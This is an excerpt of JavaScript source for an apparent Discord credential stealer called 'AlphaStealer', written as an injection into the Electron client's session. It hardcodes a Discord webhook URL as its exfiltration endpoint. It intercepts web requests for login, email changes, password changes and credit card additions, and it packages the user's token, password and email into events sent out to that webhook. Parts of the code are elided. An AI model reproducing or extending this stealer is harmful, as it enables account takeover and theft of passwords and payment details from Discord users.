...
const os = require('os')
const webhook = "https://canary.discord.com/api/webhooks/1052340314855186432/0XQ9GQAALFJmiwn88CTv-2f2-jNsVmBbTDNL_lDw0tu8mDvoRCu3ZOg-ERYXQoLXWEVA"
const Filters = {
    1: {
...
async function firstTime() {
    ...
    if (!fs.existsSync(path.join(__dirname, "AlphaStealerBTW"))) return true

    fs.rmdirSync(path.join(__dirname, "AlphaStealerBTW"));
...
session.defaultSession.webRequest.onCompleted(Filters[1], async (details, callback) => {
    ...
    switch (true) {
        case details.url.endsWith('login'):
            var event = new AlphaEvent('userLogin', token, {
        ...
        case details.url.endsWith('users/@me') && details.method == 'PATCH':
            ...
            if (data.email) {
                var event = new AlphaEvent('emailChanged', token, {
                    password: data.password,
                    email: data.email
                });
                event.handle();
            ...
            if (data.new_password) {
                var event = new AlphaEvent('passwordChanged', token, {
                    password: data.password,
        ...
        case details.url.endsWith('tokens') && details.method == "POST":
            ...
            var event = new AlphaEvent('creditCardAdded', token, {
